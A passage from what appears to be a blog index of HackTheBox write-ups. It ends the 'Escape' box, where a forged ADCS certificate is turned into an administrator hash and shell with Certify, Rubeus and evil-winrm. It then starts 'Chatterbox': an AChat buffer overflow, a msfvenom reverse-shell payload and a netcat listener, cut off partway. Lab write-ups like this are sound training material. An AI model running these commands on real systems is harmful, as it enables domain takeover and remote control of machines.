PS C:\\Users\\Ryan.Cooper\\Documents> .\\Certify.exe request /ca:dc.sequel.htb\\sequel-DC-CA /template:UserAuthentication /altname:administrator _____ _ _ __ / ____| | | (_)/ _| | | ___ _ __| |_ _| |_ _ _ | | / _ \\ '__| __| | _| | | | | |___| __/ | | |_| | | | |_| | \\_____\\___|_| \\__|_|_| \\__, | __/ | |___./ v1.0.0[*] Action: Request a Certificates[*] Current user context : sequel\\Ryan.Cooper[*] No subject name specified, using current context as subject.[*] Template : UserAuthentication[*] Subject : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb[*] AltName : administrator[*] Certificate Authority : dc.sequel.htb\\sequel-DC-CA[*] CA Response : The certificate had been issued.[*] Request ID : 13[*] cert.pem :-----BEGIN RSA PRIVATE KEY-----MIIEpAIBAAKCAQEAvsrY4RUggaMmn0gjAeiy7fbgDqJLeZzKY9zbQ+NxcOYnafNBGfrjBrvn02r+PwwvKPb5JUCzrASDyPiqCYABMsSMuzLo7rCIvLcDa23HqANXhkZOAmitd//BB/8GJfvP5eOtjtlefWGHXZIr4VJpyhZonlLYHZAuNYh0ORl2iMwwvEe3uhuheh/7ffcX64x0Kk+gj3I0uOQ53S19E1yS7T1/473OwHfvXc0HSYQ/yOSVQANUYPDt7IjRfpJCxBL2vfCpC6j34seBzxYYfF4v56JyGoj1w4YhzeIQHG+m1ifODZ7h8U7bU3hadDSdlmPoL6ja/X9Glx1BpOsFGF8lWQIDAQABAoIBAFrTuGGWrC3q3HURY1ECVUQBtfJhgqq3YIYf2uY7vYJwnqzKl+BlVnSbOaalFbov87d9s2fvoFkwoQgokNIK9QcVGKX5e3g95CpquZ8H2Pd798u9Zl+xM3uf7mX/Gw80DGm1dKc/hcMMjeOWtXsDv8br2gwdBjM0szra5fFU1OAT+htVLLzCGIBkoO7TSRT52mSWLuxDCb2T7Efu2ZQu85zEfyppx4X5Nq5safE8qa54FsNBT52NSDhkZvseq7Kp5bEuw9W7sYR4pGNmousPxswDRWfhA4+yEjebMvhVXhi/apw9ycaPUAkLNNM4RSSIQn0tOp8qzj1HLt/7CosIwp0CgYEA0ZC5kSWyiww50FRt40NbT20U8/Zon4WhBIC2AMxs35HIuGaVKRtdKW+Lzl8JNohiwnBRpRInKr+B/QyNqFaNB5lxEJ7obLhSEvsTxQhXTVPkdnVxFtiR+X1mCt3bu4ijAyYyPLBuFxmeLk1wshpvUao/XoBjyjlkWKTAds/eJXMCgYEA6RFBMzEknqSadoZpNrCWLGhZEBOJOdHoiCWFuc8d6kDtX9sFTHqehZIRASN4ZQlRzbq2WLWNpLQn+gFgkhzu4up3VRqL0mlzQF5vD6vExGZAOUY8SF4ekmV2VFTzffTyDXomYfMwScxyoTS/G8hipY7b2LKYRSKKo4ICT/AjNwMCgYEAoAyr7JKh3Vgk/1q74gmbPvnMOtZB6TMhWlMCrXFy5PxuE4ck/BQN/otWdvJWEvPumRk3AZ7vktJX8G8Z8SrI4rjphQwX7pCG/kALRTutkT01CtN+3zffpG+E81+lZYBhHxKY44jLS5EhIbO7EgrmYbRoWUAs9lEGtjx9UUBIJMkCgYEAmnozSujxqqzTLGgeaH9Wqgxnq74nIEm+5C5qmiNrYo6yRux2cKB9XW7ZEnYeIGmy7LcqkVWUkmxOauhqx62hsIlTmvbDYi0+lJWC61IgU0SqoMuqvRSVEtdpPLApy3yEyuYBdr6nbOKzv6GkYZfJuo4brV+CiaBBX+qV+cHitV0CgYB4DsJg8SlVIWqBWO0xbYXWtzvEIjWknujxXGPMbLBOCoyhWmcmiEEhCdsPWlci4dAQOseBHDdbolOKnebewf8bmF3XxH9gBOHYrKaMBlGCTGz7Ydyd4+wlhX7U6keISrwAoAwYCDjmN/sxhAeKZKxOZ/3XLbNZ22X6i6TiIy7Ddg==-----END RSA PRIVATE KEY----------BEGIN CERTIFICATE-----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-----END CERTIFICATE-----[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfxCertify completed in 00:00:13.6939714*Evil-WinRM* PS C:\\Users\\Ryan.Cooper\\Documents>```{: .nolineno}Lets save the `cert.pem` content from `-----BEGIN RSA PRIVATE KEY-----` to `-----END CERTIFICATE-----` in our attacker machine .Now I have to convert the `.pem` file into `.pfx` file so for that I will use `openssl` command â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Escape]â””â”€$ openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfxEnter Export Password:Verifying - Enter Export Password:```{: .nolineno}Now the cert.pfx certificate file will be use to get a TGT as administrator and will be ran through `Rubeus` with `asktgt` command :```bash*Evil-WinRM* PS C:\\Users\\Ryan.Cooper\\Documents> .\\Rubeus.exe asktgt /user:administrator /certificate:C:\\Users\\Ryan.Cooper\\Documents\\cert.pfx ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.3.1[*] Action: Ask TGT[*] Got domain: sequel.htb[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\\administrator'[*] Using domain controller: fe80::85a8:f6b4:e862:111f%4:88[+] TGT request successful![*] base64(ticket.kirbi): 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 ServiceName : krbtgt/sequel.htb ServiceRealm : SEQUEL.HTB UserName : administrator (NT_PRINCIPAL) UserRealm : SEQUEL.HTB StartTime : 1/25/2024 5:24:27 AM EndTime : 1/25/2024 3:24:27 PM RenewTill : 2/1/2024 5:24:27 AM Flags : name_canonicalize, pre_authent, initial, renewable KeyType : rc4_hmac Base64(key) : rivHnHhhruheuua+r1u1gw== ASREP (key) : B9B24323F182018EAA9F983BAF772C99*Evil-WinRM* PS C:\\Users\\Ryan.Cooper\\Documents>```{: .nolineno}It works! However, Rubeus tries to load the returned ticket directly into the current session, so in theory, once I run this I could just enter administratorâ€™s folders and get the flag. However, this doesnâ€™t work over Evil-WinRM.So I used some more flags in rubeus for complete information exposer `/getcredentials` `/show` `/nowrap` .```bash*Evil-WinRM* PS C:\\Users\\Ryan.Cooper\\Documents> .\\Rubeus.exe asktgt /user:administrator /certificate:C:\\Users\\Ryan.Cooper\\Documents\\cert.pfx /getcredentials /show /nowrap ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.3.1[*] Action: Ask TGT[*] Got domain: sequel.htb[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\\administrator'[*] Using domain controller: fe80::85a8:f6b4:e862:111f%4:88[+] TGT request successful![*] base64(ticket.kirbi): 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 ServiceName : krbtgt/sequel.htb ServiceRealm : SEQUEL.HTB UserName : administrator (NT_PRINCIPAL) UserRealm : SEQUEL.HTB StartTime : 1/25/2024 5:30:34 AM EndTime : 1/25/2024 3:30:34 PM RenewTill : 2/1/2024 5:30:34 AM Flags : name_canonicalize, pre_authent, initial, renewable KeyType : rc4_hmac Base64(key) : nlgRYTLwS0pqwhInAVN3Og== ASREP (key) : 38DC6A76CE9CC213D8BB23BA95A386DE[*] Getting credentials using U2U CredentialInfo : Version : 0 EncryptionType : rc4_hmac CredentialData : CredentialCount : 1 NTLM : A52F78E4C751E5F5E17E1E9F3E58F4EE*Evil-WinRM* PS C:\\Users\\Ryan.Cooper\\Documents>```{: .nolineno}Now I got the Administrators NTLM hash so lets have a shell â†’```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Escape]â””â”€$ evil-winrm -i 10.10.11.202 -u Administrator -H A52F78E4C751E5F5E17E1E9F3E58F4EE Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> cd ..*Evil-WinRM* PS C:\\Users\\Administrator> whoamisequel\\administrator*Evil-WinRM* PS C:\\Users\\Administrator> hostnamedc*Evil-WinRM* PS C:\\Users\\Administrator> tree /f /aFolder PATH listingVolume serial number is EB33-4140C:.+---.azuredatastudio| | argv.json| || \\---extensions+---3D Objects+---Contacts+---Desktop| root.txt|+---Documents| +---SQL Server Management Studio| | \\---Code Snippets| | \\---SQL| | \\---My Code Snippets| \\---Visual Studio 2017| \\---Templates| +---ItemTemplates| | +---JavaScript| | \\---TypeScript| \\---ProjectTemplates| +---JavaScript| \\---TypeScript+---Downloads+---Favorites| | Bing.url| || \\---Links+---Links| Desktop.lnk| Downloads.lnk|+---Music+---Pictures+---Saved Games+---Searches\\---Videos*Evil-WinRM* PS C:\\Users\\Administrator> type Desktop\\root.txte4bd13809a4e52f7f5373a704a205e20*Evil-WinRM* PS C:\\Users\\Administrator>```{: .nolineno}I am Administrator Now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Chatterbox", "url": "/posts/Chatterbox/", "categories": "HackTheBox", "tags": "Buffer Overflow, PrivEsc, Public Exploit, Windows, icacls", "date": "2024-01-25 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Chatterbox]â””â”€$ nmap -sC -sV -p- -T5 -oN Nmap_Result.txt -Pn 10.10.10.74Nmap scan report for 10.10.10.74Host is up (0.24s latency).Not s...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Chatterbox]â””â”€$ nmap -sC -sV -p- -T5 -oN Nmap_Result.txt -Pn 10.10.10.74Nmap scan report for 10.10.10.74Host is up (0.24s latency).Not shown: 65409 closed tcp ports (reset), 115 filtered tcp ports (no-response)PORT STATE SERVICE VERSION135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)9255/tcp open tcpwrapped9256/tcp open tcpwrapped49152/tcp open msrpc Microsoft Windows RPC49153/tcp open msrpc Microsoft Windows RPC49154/tcp open msrpc Microsoft Windows RPC49155/tcp open msrpc Microsoft Windows RPC49156/tcp open msrpc Microsoft Windows RPC49157/tcp open msrpc Microsoft Windows RPCService Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)| OS CPE: cpe:/o:microsoft:windows_7::sp1:professional| Computer name: Chatterbox| NetBIOS computer name: CHATTERBOX\\x00| Workgroup: WORKGROUP\\x00|_ System time: 2024-01-04T15:20:03-05:00|_clock-skew: mean: 6h40m05s, deviation: 2h53m14s, median: 5h00m03s| smb2-security-mode: | 2:1:0: |_ Message signing enabled but not required| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-time: | date: 2024-01-04T20:20:01|_ start_date: 2024-01-04T20:05:04```{: .nolineno}## Public Exploit Enumeration â¤µï¸I got this port `9255`,`9256` open so I started doing service version scan through nmap and got â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Chatterbox]â””â”€$ sudo nmap -sV -p 9255,9256 10.10.10.74 PORT STATE SERVICE VERSION9255/tcp open http AChat chat system httpd9256/tcp open achat AChat chat system```{: .nolineno}Now I searched online related to this exploit and got it â†’![Untitled](Chatterbox/Untitled%201.png)```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Chatterbox]â””â”€$ cp /usr/share/exploitdb/exploits/windows/remote/36025.py achat.py â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Chatterbox]â””â”€$ open achat.py```{: .nolineno}It is basically performing buffer overflow attack and I need to have latest payload modified from attacker machine to execute it â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Chatterbox]â””â”€$ msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp lhost=10.10.16.29 lport=4444 -e x86/unicode_mixed -b '\\x00\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff' BufferRegister=EAX -f pythonFound 1 compatible encodersAttempting to encode payload with 1 iterations of x86/unicode_mixedx86/unicode_mixed succeeded with size 774 (iteration=0)x86/unicode_mixed chosen with final size 774Payload size: 774 bytesFinal size of python file: 3822 bytesbuf = b\"\"buf += b\"\\x50\\x50\\x59\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\"buf += b\"\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\"buf += b\"\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x6a\\x58\\x41\\x51\"buf += b\"\\x41\\x44\\x41\\x5a\\x41\\x42\\x41\\x52\\x41\\x4c\\x41\\x59\"buf += b\"\\x41\\x49\\x41\\x51\\x41\\x49\\x41\\x51\\x41\\x49\\x41\\x68\"buf += b\"\\x41\\x41\\x41\\x5a\\x31\\x41\\x49\\x41\\x49\\x41\\x4a\\x31\"buf += b\"\\x31\\x41\\x49\\x41\\x49\\x41\\x42\\x41\\x42\\x41\\x42\\x51\"......```{: .nolineno}Now I replaced the payload along with `server_address = ('10.10.10.74', 9256)` with victim machine IP address and started listener on port 4444 .```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Chatterbox]â””â”€$ rlwrap nc -lvnp 4444 listening on [any] 4444 ...connect to [10.10.16.29] from (UNKNOWN) [10.10.10.74] 49158Microsoft Windows [Version 6.1.7601]Copyright (c) 2009 Microsoft Corporation. All rights reserved.C:\\Windows\\system32>C:\\Windows\\system32>C:\\Windows\\system32>whoamiwhoamichatterbox\\alfredC:\\Windows\\system32>hostnamehostnameChatterboxC:\\Windows\\system32>cd C:\\Users\\Alfredcd C:\\Users\\AlfredC:\\Users\\Alfred>tree /f /atree /f /aFolder PATH listingVolume serial number is 00000200 502F:F304C:.+---Contacts| Alfred.contact| +---Desktop| user.txt| +---Documents+---Downloads| MSEInstall.exe| +---Favorites| +---Links| | Suggested Sites.url| | Web Slice Gallery.url| | | +---Links for United States| | GobiernoUSA.gov.url| | USA.gov.url| | | +---Microsoft Websites| | IE Add-on site.url| | IE site on Microsoft.com.url| | Microsoft At Home.url| | Microsoft At Work.url| | Microsoft Store.url| | | +---MSN Websites| | MSN Autos.url| | MSN Entertainment.url| | MSN Money.url| | MSN Sports.url| | MSN.url| | MSNBC News.url| | | \\---Windows Live| Get Windows Live.url| Windows Live Gallery.url| Windows Live Mail.url| Windows Live Spaces.url| +---Links| Desktop.lnk| Downloads.lnk| RecentPlaces.lnk| +---Music+---Pictures+---Saved Games+---Searches\\---VideosC:\\Users\\Alfred>```{: .nolineno}Now I ran winpeas in this box and got this password â†’![Untitled](Chatterbox/Untitled%202.png)Also I got to know that I as a Alfred user have `All Access` in Administrators account â†’```powershellC:\\Users\\Administrator>tree /f /atree /f /aFolder PATH listingVolume serial number is 00000072 502F:F304C:.+---Contacts| Administrator.contact| +---Desktop| root.txt| +---Documents+---Downloads| | IE11-Windows6.1-x86-en-us.exe| | SDelete.zip| | | \\---SDelete| Eula.txt| sdelete.exe| sdelete64.exe| sdelete64a.exe| +---Favorites| +---Links| | Suggested Sites.url| | Web Slice Gallery.url| | | +---Links for United States| | GobiernoUSA.gov.url| | USA.gov.url| | | +---Microsoft Websites| | IE Add-on site.url| | IE site on Microsoft.com.url| | Microsoft At Home.url| | Microsoft At Work.url| | Microsoft Store.url| | | +---MSN Websites| | MSN Autos.url| | MSN Entertainment.url| | MSN Money.url| | MSN Sports.url| | MSN.url| | MSNBC News.url| | | \\---Windows Live| Get Windows Live.url| Windows Live Gallery.url| Windows Live Mail.url| Windows Live Spaces.url| +---Links| Desktop.lnk| Downloads.lnk| RecentPlaces.lnk| +---Music+---Pictures+---Saved Games+---Searches\\---VideosC:\\Users\\Administrator>type Desktop\\root.txttype Desktop\\root.txtAccess is denied.C:\\Users\\Administrator>icacls Desktop\\root.txticacls 